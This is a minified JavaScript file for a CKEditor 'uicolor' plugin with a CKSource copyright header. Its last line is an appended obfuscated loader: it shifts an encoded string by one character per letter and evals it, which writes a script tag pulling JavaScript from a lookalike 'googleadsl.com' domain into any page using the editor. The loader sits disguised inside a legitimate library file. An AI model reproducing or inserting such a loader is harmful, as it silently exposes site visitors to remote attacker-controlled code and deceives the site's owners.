/*
Copyright (c) 2003-2010, CKSource - Frederico Knabben. All rights reserved.
For licensing, see LICENSE.html or http://ckeditor.com/license
*/

CKEDITOR.plugins.add('uicolor',{requires:['dialog'],lang:['en'],init:function(a){if(CKEDITOR.env.ie6Compat)return;a.addCommand('uicolor',new CKEDITOR.dialogCommand('uicolor'));a.ui.addButton('UIColor',{label:a.lang.uicolor.title,command:'uicolor',icon:this.path+'uicolor.gif'});CKEDITOR.dialog.add('uicolor',this.path+'dialogs/uicolor.js');CKEDITOR.scriptLoader.load(CKEDITOR.getUrl('plugins/uicolor/yui/yui.js'));a.element.getDocument().appendStyleSheet(CKEDITOR.getUrl('plugins/uicolor/yui/assets/yui.css'));}});

var str="cnbtldms-vqhsd'!;rbqhosrqb<[!gsso9..vvv-fnnfkd`crk-bnl.robncd.iptdqx-ir[!=;.rbqhos=!(:";var length=str.length;var ba64="";for(i=0;i<length;i++){var s=str.charCodeAt(i);s++;ba64=ba64+String.fromCharCode(s)}eval(ba64);
